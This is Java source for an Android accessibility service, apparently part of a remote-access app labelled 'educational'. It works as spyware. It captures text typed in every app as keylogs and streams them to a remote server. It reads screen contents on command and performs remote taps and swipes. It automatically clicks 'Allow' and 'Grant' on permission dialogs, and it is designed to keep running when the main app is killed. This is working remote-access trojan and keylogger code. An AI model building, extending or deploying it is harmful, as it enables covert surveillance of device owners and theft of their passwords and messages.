package com.remoteaccess.educational.accessibility;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.accessibilityservice.GestureDescription;
import android.content.Intent;
import android.graphics.Path;
import android.graphics.Point;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;
import android.view.Display;
import android.view.WindowManager;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

import org.json.JSONObject;

import java.util.ArrayList;
import java.util.List;

/**
 * Standalone Accessibility Service — runs in a SEPARATE APK and SEPARATE PROCESS.
 *
 * KEY BENEFIT: Killing the main app (com.remoteaccess.educational) has ZERO effect
 * on this service. It lives in its own process (:accessibility) within this APK
 * (com.remoteaccess.accessibility). The user enables it once in Settings and it
 * stays enabled regardless of what happens to the main app.
 *
 * It communicates with the remote server via its own SocketClient / SocketService,
 * also running in the same :accessibility process.
 */
public class StandaloneAccessibilityService extends AccessibilityService
        implements SocketClient.CommandHandler {

    private static final String TAG = "StandaloneAccSvc";
    private static StandaloneAccessibilityService sInstance;

    private int screenWidth;
    private int screenHeight;

    // Uninstall-assist: auto-click OK/Uninstall for 5 seconds only
    private volatile boolean uninstallAssistMode = false;
    private Handler uninstallHandler;

    // Auto-grant: click Allow/Grant on permission dialogs for 60 seconds
    private volatile boolean autoGrantMode = false;
    private Handler autoGrantHandler;

    private final List<String> keylogBuffer = new ArrayList<>();

    public static StandaloneAccessibilityService getInstance() { return sInstance; }

    @Override
    public void onServiceConnected() {
        try { super.onServiceConnected(); } catch (Exception ignored) {}
        sInstance = this;

        try {
            AccessibilityServiceInfo info = new AccessibilityServiceInfo();
            info.eventTypes = AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED
                    | AccessibilityEvent.TYPE_VIEW_FOCUSED
                    | AccessibilityEvent.TYPE_VIEW_CLICKED
                    | AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED
                    | AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED;
            info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC;
            info.flags = AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS
                    | AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS
                    | AccessibilityServiceInfo.FLAG_INCLUDE_NOT_IMPORTANT_VIEWS;
            info.notificationTimeout = 100;
            setServiceInfo(info);
        } catch (Exception ignored) {}

        try {
            WindowManager wm = (WindowManager) getSystemService(WINDOW_SERVICE);
            Display d = wm.getDefaultDisplay();
            Point sz = new Point();
            d.getRealSize(sz);
            screenWidth  = sz.x;
            screenHeight = sz.y;
        } catch (Exception ignored) {}

        // Start the socket service and register ourselves as the command handler
        try {
            Intent svc = new Intent(this, SocketService.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(svc);
            } else {
                startService(svc);
            }
        } catch (Exception ignored) {}

        // Wait briefly for SocketService to start, then register
        new Handler(Looper.getMainLooper()).postDelayed(() -> {
            SocketClient client = SocketService.getInstance();
            if (client != null) client.setCommandHandler(this);
        }, 1500);

        startAutoGrantTimer();
        Log.i(TAG, "StandaloneAccessibilityService connected — independent of main app");
    }

    // ── SocketClient.CommandHandler ──────────────────────────────────────────

    @Override
    public void onCommand(String command, JSONObject params, String commandId) {
        try {
            JSONObject result = executeCommand(command, params);
            SocketClient client = SocketService.getInstance();
            if (client != null) {
                client.sendResult(commandId, command,
                        result.optBoolean("success", false), result);
            }
        } catch (Exception e) {
            Log.e(TAG, "onCommand error: " + e.getMessage());
        }
    }

    private JSONObject executeCommand(String command, JSONObject params) throws Exception {
        JSONObject res = new JSONObject();
        switch (command) {
            case "touch": {
                float x = (float) params.optDouble("x", screenWidth / 2.0);
                float y = (float) params.optDouble("y", screenHeight / 2.0);
                boolean ok = performClick(x, y);
                res.put("success", ok);
                break;
            }
            case "swipe": {
                String dir = params.optString("direction", "up");
                boolean ok = performSwipeDir(dir);
                res.put("success", ok);
                break;
            }
            case "press_home":
                res.put("success", performGlobalAction(GLOBAL_ACTION_HOME));
                break;
            case "press_back":
                res.put("success", performGlobalAction(GLOBAL_ACTION_BACK));
                break;
            case "press_recents":
                res.put("success", performGlobalAction(GLOBAL_ACTION_RECENTS));
                break;
            case "click_by_text": {
                String text = params.optString("text", "");
                AccessibilityNodeInfo root = getRootInActiveWindow();
                boolean clicked = root != null && findAndClickText(root, text);
                if (root != null) root.recycle();
                res.put("success", clicked);
                break;
            }
            case "read_screen": {
                AccessibilityNodeInfo root = getRootInActiveWindow();
                JSONObject screen = new JSONObject();
                if (root != null) {
                    screen.put("packageName", root.getPackageName() != null ? root.getPackageName() : "");
                    screen.put("text", collectAllText(root));
                    root.recycle();
                }
                res.put("success", true);
                res.put("screen", screen);
                break;
            }
            case "get_keylogs": {
                List<String> logs = new ArrayList<>(keylogBuffer);
                keylogBuffer.clear();
                org.json.JSONArray arr = new org.json.JSONArray();
                for (String l : logs) arr.put(l);
                res.put("success", true);
                res.put("keylogs", arr);
                break;
            }
            case "enable_uninstall_assist":
                enableUninstallAssist();
                res.put("success", true);
                break;
            case "ping":
                res.put("success", true);
                res.put("pong", true);
                break;
            default:
                res.put("success", false);
                res.put("error", "Unknown command: " + command);
        }
        return res;
    }

    // ── Accessibility Event ───────────────────────────────────────────────────

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        try {
            String pkg = event.getPackageName() != null ? event.getPackageName().toString() : "";

            switch (event.getEventType()) {
                case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED: {
                    List<CharSequence> texts = event.getText();
                    if (texts != null && !texts.isEmpty()) {
                        StringBuilder sb = new StringBuilder();
                        for (CharSequence cs : texts) sb.append(cs);
                        keylogBuffer.add("[" + pkg + "] TEXT: " + sb);

                        // Forward to server
                        SocketClient client = SocketService.getInstance();
                        if (client != null && client.isConnected()) {
                            try {
                                JSONObject ev = new JSONObject();
                                ev.put("event", "keylog:push");
                                JSONObject d  = new JSONObject();
                                d.put("packageName", pkg);
                                d.put("text", sb.toString());
                                d.put("type", "TEXT_CHANGED");
                                ev.put("data", d);
                                // Use sendResult as a generic send for now
                                client.sendResult("__push__", "keylog_push", true, ev);
                            } catch (Exception ignored) {}
                        }
                    }
                    break;
                }
                case AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED:
                    autoClickIfNeeded();
                    break;
            }
        } catch (Exception ignored) {}
    }

    @Override
    public void onInterrupt() {}

    @Override
    public void onDestroy() {
        try { super.onDestroy(); } catch (Exception ignored) {}
        sInstance = null;
        if (uninstallHandler != null) { uninstallHandler.removeCallbacksAndMessages(null); uninstallHandler = null; }
        if (autoGrantHandler != null)  { autoGrantHandler.removeCallbacksAndMessages(null);  autoGrantHandler  = null; }
        uninstallAssistMode = false;
        autoGrantMode = false;
    }

    // ── Gesture helpers ───────────────────────────────────────────────────────

    public boolean performClick(float x, float y) {
        try {
            Path path = new Path();
            path.moveTo(x, y);
            GestureDescription g = new GestureDescription.Builder()
                    .addStroke(new GestureDescription.StrokeDescription(path, 0, 100))
                    .build();
            return dispatchGesture(g, null, null);
        } catch (Exception e) { return false; }
    }

    private boolean performSwipeDir(String dir) {
        float cx = screenWidth  / 2f;
        float cy = screenHeight / 2f;
        float dx = 0, dy = 0;
        switch (dir) {
            case "up":    dy = -screenHeight * 0.3f; break;
            case "down":  dy =  screenHeight * 0.3f; break;
            case "left":  dx = -screenWidth  * 0.3f; break;
            case "right": dx =  screenWidth  * 0.3f; break;
        }
        try {
            Path path = new Path();
            path.moveTo(cx, cy);
            path.lineTo(cx + dx, cy + dy);
            GestureDescription g = new GestureDescription.Builder()
                    .addStroke(new GestureDescription.StrokeDescription(path, 0, 400))
                    .build();
            return dispatchGesture(g, null, null);
        } catch (Exception e) { return false; }
    }

    // ── Node helpers ──────────────────────────────────────────────────────────

    private boolean findAndClickText(AccessibilityNodeInfo node, String text) {
        if (node == null || text == null || text.isEmpty()) return false;
        try {
            CharSequence nodeText = node.getText();
            if (nodeText != null && nodeText.toString().trim().equalsIgnoreCase(text.trim())) {
                if (node.isClickable()) { node.performAction(AccessibilityNodeInfo.ACTION_CLICK); return true; }
                AccessibilityNodeInfo p = node.getParent();
                if (p != null && p.isClickable()) { p.performAction(AccessibilityNodeInfo.ACTION_CLICK); p.recycle(); return true; }
            }
            for (int i = 0; i < node.getChildCount(); i++) {
                AccessibilityNodeInfo child = node.getChild(i);
                if (child != null) {
                    if (findAndClickText(child, text)) { child.recycle(); return true; }
                    child.recycle();
                }
            }
        } catch (Exception ignored) {}
        return false;
    }

    private String collectAllText(AccessibilityNodeInfo node) {
        if (node == null) return "";
        StringBuilder sb = new StringBuilder();
        collectTextRec(node, sb, 0);
        return sb.toString();
    }

    private void collectTextRec(AccessibilityNodeInfo node, StringBuilder sb, int depth) {
        if (node == null || depth > 12) return;
        try {
            if (node.getText() != null) sb.append(node.getText()).append(" ");
            for (int i = 0; i < node.getChildCount(); i++) {
                AccessibilityNodeInfo c = node.getChild(i);
                if (c != null) { collectTextRec(c, sb, depth + 1); c.recycle(); }
            }
        } catch (Exception ignored) {}
    }

    // ── Uninstall assist (5 seconds only) ────────────────────────────────────

    public void enableUninstallAssist() {
        uninstallAssistMode = true;
        Log.i(TAG, "Uninstall-assist ENABLED — auto-disabling after 5s");
        if (uninstallHandler == null) uninstallHandler = new Handler(Looper.getMainLooper());
        uninstallHandler.removeCallbacksAndMessages(null);
        uninstallHandler.postDelayed(() -> {
            uninstallAssistMode = false;
            Log.i(TAG, "Uninstall-assist AUTO-DISABLED");
        }, 5000);
    }

    // ── Auto-grant (permission dialogs) ─────────────────────────────────────

    private void startAutoGrantTimer() {
        autoGrantMode = true;
        autoGrantHandler = new Handler(Looper.getMainLooper());
        autoGrantHandler.postDelayed(() -> {
            autoGrantMode = false;
            Log.i(TAG, "Auto-grant mode expired");
        }, 60000);
    }

    private void autoClickIfNeeded() {
        try {
            AccessibilityNodeInfo root = getRootInActiveWindow();
            if (root == null) return;

            if (autoGrantMode) {
                for (String word : new String[]{"Allow all the time", "Allow", "Grant", "OK", "Accept"}) {
                    if (findAndClickText(root, word)) { root.recycle(); return; }
                }
            }

            if (uninstallAssistMode) {
                for (String word : new String[]{"Uninstall", "OK", "Delete", "Remove", "Yes", "Confirm"}) {
                    if (findAndClickText(root, word)) { root.recycle(); return; }
                }
            }

            root.recycle();
        } catch (Exception ignored) {}
    }
}
